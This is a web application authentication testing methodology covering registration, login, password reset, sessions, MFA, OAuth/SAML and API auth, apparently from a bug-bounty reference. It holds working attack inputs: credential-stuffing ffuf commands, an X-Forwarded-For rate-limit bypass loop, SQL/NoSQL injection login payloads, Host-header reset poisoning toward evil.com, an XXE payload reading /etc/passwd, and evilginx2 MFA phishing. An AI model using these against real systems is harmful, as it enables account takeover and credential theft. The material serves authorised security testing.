---
id: "authentication-testing"
title: "Authentication Testing Methodology - Complete Guide"
type: "methodology"
category: "web-application"
subcategory: "auth"
tags: ["authentication", "password-reset", "mfa-bypass", "session-management", "sso", "oauth", "registration", "brute-force", "account-takeover", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["account-takeover", "oauth-jwt-saml-bypasses", "auth-bypass-payloads", "csrf-modern"]
updated: "2026-04-14"
---

## Overview

Authentication testing covers every point where a user proves their identity: registration, login, password reset, session management, MFA, SSO, and API authentication. Auth flaws are the #1 path to account takeover. Systematically test each auth flow for logic flaws, not just technical vulns. Payout: $500-$50k+ for full ATO chains.

## Phase 1: Registration Testing

### Account creation flaws
```
# Duplicate registration
# Register with same email in different cases
admin@target.com
Admin@target.com
admin@target.com (trailing space)
admin@target.com\x00

# Email validation bypass
admin@target.com@evil.com
admin+tag@target.com (does it link to admin@target.com?)
admin@target.co\x0d\x0am (CRLF in email)

# Username enumeration via registration
# Different error for "email exists" vs "registration failed"
# Timing difference: existing user lookup takes longer

# Weak password policy
# Can you set password: 1234, empty, single char?
# Is there a max length that truncates? (try 1000+ chars)

# Mass assignment at registration
POST /api/register
{"email":"a@b.com","password":"test","role":"admin","verified":true,"is_staff":true}

# Race condition: register same account simultaneously
# Two accounts created with same email?
```

### Email verification bypass
```
# Skip verification entirely
# Register → immediately access app without confirming email
# Modify verification link parameters

# Token manipulation
# Increment/decrement verification token
# Use expired tokens
# Brute force short tokens (4-6 char)
# Change email in verification link to another user's email

# Re-registration after verification
# Can you re-register to steal a verified account?
```

## Phase 2: Login Testing

### Brute force attacks
```bash
# Credential stuffing
ffuf -u https://target.com/api/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"FUZZ","password":"FUZZ2"}' \
  -w emails.txt:FUZZ -w passwords.txt:FUZZ2 \
  -fc 401 -rate 10

# Rate limit bypass techniques
# Rotate IP: use X-Forwarded-For, X-Real-IP headers
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: RANDOM_IP
X-Originating-IP: RANDOM_IP
X-Remote-IP: RANDOM_IP
X-Client-IP: RANDOM_IP

# Add null bytes or spaces to parameters
{"email":"admin@target.com","password":"pass1"}
{"email":"admin@target.com ","password":"pass1"}  # Trailing space
{"email":"admin@target.com","password":"pass1","extra":"param"}  # Extra param
{"email":["admin@target.com"],"password":"pass1"}  # Array instead of string

# Case manipulation to bypass per-account lockout
admin@target.com
Admin@target.com
ADMIN@target.com
admin@Target.com

# HTTP method switching
POST /login → PUT /login (different rate limit?)

# IP rotation
for ip in $(seq 1 255); do
  curl -H "X-Forwarded-For: 10.0.0.$ip" \
    -d "email=admin@test.com&password=test" \
    https://target.com/login
done
```

### Authentication bypass
```
# Default credentials
admin:admin, admin:password, test:test, root:root

# SQL injection in login
' OR 1=1--
' OR 1=1#
admin'--
" OR ""="

# NoSQL injection in login
{"email":"admin@target.com","password":{"$ne":""}}
{"email":{"$regex":"admin"},"password":{"$ne":""}}

# Response manipulation (client-side auth check)
# Intercept response, change {"success":false} to {"success":true}
# Change HTTP 403 to 200

# Parameter pollution
email=admin@target.com&email=attacker@evil.com&password=test

# JSON type confusion
{"email":"admin@target.com","password":true}
{"email":"admin@target.com","password":0}
{"email":"admin@target.com","password":null}
{"email":"admin@target.com","password":[]}
```

## Phase 3: Password Reset Testing

### Token analysis
```
# Request multiple reset tokens for same account
# Are they sequential? Time-based? Predictable?
# Do old tokens get invalidated when new one is requested?

# Token entropy analysis
# Collect 10+ tokens, look for patterns
# base64 decode: contains timestamp? email? user ID?
# UUID v1: extract timestamp component

# Token reuse
# Use the same reset token twice
# Use a token after password has been changed
```

### Password reset poisoning
```http
# Host header poisoning
POST /forgot-password HTTP/1.1
Host: evil.com

email=victim@target.com

# X-Forwarded-Host poisoning
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com

# Referer-based token leakage
# Reset page loads external resources (analytics, images)
# Referer header leaks reset token to external domain
```

### Password reset flow abuse
```
# Change email after requesting reset
# 1. Request reset for victim@target.com
# 2. Change account email to attacker@evil.com
# 3. Reset link still valid for the account

# IDOR in password reset
POST /reset-password
{"token":"valid-token","user_id":"VICTIM_ID","password":"hacked"}

# Password reset via API vs web
# Web has CSRF protection, API doesn't?
# Different validation on different endpoints?

# OTP brute force
# 4-digit OTP: 10,000 combinations
# 6-digit OTP: 1,000,000 combinations
# Check rate limiting, lockout policy
# Multiple OTP requests → which one is valid? (all of them?)
```

## Phase 4: Session Management

### Session token analysis
```
# Predictability
# Collect 100+ session tokens, analyze patterns
# Tools: Burp Sequencer (statistical randomness analysis)

# Session fixation
# Can you set a session cookie before login?
# Does login rotate the session ID? (it should)
Set-Cookie: session=ATTACKER_KNOWN_VALUE
# If victim logs in with this session, attacker has access

# Session persistence
# Does session survive password change? (it shouldn't)
# Does session survive logout? (it shouldn't)
# What's the session timeout? (test after 1h, 8h, 24h)

# Concurrent sessions
# How many simultaneous sessions are allowed?
# Does logging out destroy all sessions or just current?
```

### Cookie security
```
# Check cookie attributes
Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=Strict; Path=/

# Missing Secure flag → session hijacking via HTTP
# Missing HttpOnly → XSS can steal session
# Missing SameSite → CSRF attacks possible
# Overly broad Path → accessible from unintended paths
# Overly broad Domain → accessible from subdomains

# Cookie scope attacks
# If Domain=.target.com, any subdomain can read/set the cookie
# Compromised subdomain → session hijacking on main domain
```

## Phase 5: MFA Testing

### MFA bypass techniques
```
# Direct bypass
# Access protected pages directly without completing MFA step
GET /dashboard (after login, before MFA)
# Does the server check MFA completion?

# Response manipulation
# Change MFA verification response from failure to success
{"status":"invalid_code"} → {"status":"valid"}

# Backup code abuse
# Are backup codes rate-limited?
# Are they long enough to resist brute force?
# Do they expire?

# MFA disable without verification
# Can you disable MFA from settings without entering current MFA code?
# Can you disable via API even if web requires verification?

# Code reuse
# Can you use the same TOTP code multiple times?
# Window of validity: 30s standard, but often 90s or more

# Recovery flow bypass
# "Lost my phone" flow may skip MFA entirely
# Password reset may disable MFA

# SIM swap / SMS interception
# If SMS-based, test for SIM swap vulnerability
# SS7 attacks (not typically in scope)

# Adversary-in-the-Middle (AiTM)
# Real-time phishing proxy: evilginx2, modlishka
# Intercepts session token AFTER successful MFA
```

### MFA enrollment flaws
```
# TOTP secret exposure
# Is the TOTP secret visible in page source after setup?
# Can you retrieve the QR code/secret via API?
# Does re-enrollment invalidate old TOTP secret?

# Race condition
# Enroll MFA on victim's account before they do
# Link attacker's authenticator to victim's account
```

## Phase 6: SSO / OAuth Testing

### OAuth vulnerabilities
```
# redirect_uri manipulation (see open-redirect payloads)
redirect_uri=https://evil.com
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com/callback/../redirect?url=evil.com

# State parameter
# Remove state → CSRF possible
# Reuse state across sessions
# Predictable state values

# Token leakage
# Authorization code in Referer header
# Token in URL fragment leaking to third-party scripts

# Scope escalation
# Request more scopes than authorized
scope=openid+profile+email+admin

# Account linking abuse
# Link attacker's OAuth to victim's local account
# 1. Start OAuth flow
# 2. Get OAuth callback URL with code
# 3. Send to victim (CSRF-style)
# 4. Victim's account linked to attacker's OAuth
```

### SAML vulnerabilities
```
# Signature wrapping
# Move signed assertion, add unsigned malicious assertion
# XML signature validation may only check first/last assertion

# Comment injection
# user@target.com<!--hacker-->@evil.com
# Some parsers ignore comments: becomes user@target.com

# SAML response replay
# Reuse valid SAML response

# XXE in SAML
# SAML is XML → test XXE payloads
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

## Phase 7: API Authentication

```
# API key testing
# Is the API key in URL? (leaks in logs, Referer)
# Key rotation: do old keys get revoked?
# Key scope: can user-level key access admin endpoints?
# Key sharing: same key across environments?

# Bearer token testing
# Token expiry: do tokens expire at all?
# Token revocation: does logout invalidate the token?
# Token scope: can tokens from one service access another?

# JWT-specific: see oauth-jwt-saml-bypasses for full coverage
# Algorithm confusion, none algorithm, key brute force
# Claim manipulation (sub, role, exp)
```

## Testing Checklist

```
REGISTRATION:
[ ] Duplicate account creation tested
[ ] Email validation bypass tested
[ ] Username enumeration via registration responses
[ ] Mass assignment at registration
[ ] Weak password policy checked
[ ] Email verification bypass tested

LOGIN:
[ ] Brute force protection tested (rate limiting, lockout)
[ ] Rate limit bypass techniques tested
[ ] Default credentials tested
[ ] SQLi/NoSQLi in login tested
[ ] Response manipulation tested
[ ] Username enumeration via login responses/timing

PASSWORD RESET:
[ ] Token predictability analyzed
[ ] Token expiration tested
[ ] Token reuse tested
[ ] Host header poisoning tested
[ ] IDOR in reset flow tested
[ ] OTP brute force tested

SESSION:
[ ] Session randomness (Burp Sequencer)
[ ] Session fixation tested
[ ] Session invalidation on logout/password change
[ ] Cookie security attributes checked
[ ] Concurrent session limits tested

MFA:
[ ] Direct page access bypass tested
[ ] Response manipulation tested
[ ] Backup code brute force tested
[ ] MFA disable without verification tested
[ ] Code reuse tested
[ ] Recovery flow bypass tested

SSO/OAUTH:
[ ] redirect_uri manipulation tested
[ ] State parameter validation tested
[ ] Token leakage channels checked
[ ] Account linking CSRF tested
[ ] SAML signature validation tested
```

## Tools

- **Burp Suite Pro** -- Session analysis, Sequencer, auth testing
- **ffuf/hydra** -- Credential brute forcing
- **jwt_tool** -- JWT analysis and manipulation
- **evilginx2** -- AiTM phishing for MFA bypass
- **SAMLRaider** -- Burp extension for SAML testing
- **Autorize** -- Burp extension for auth testing
- **o365spray** -- Microsoft 365 credential testing
- **nuclei** -- Auth vulnerability templates
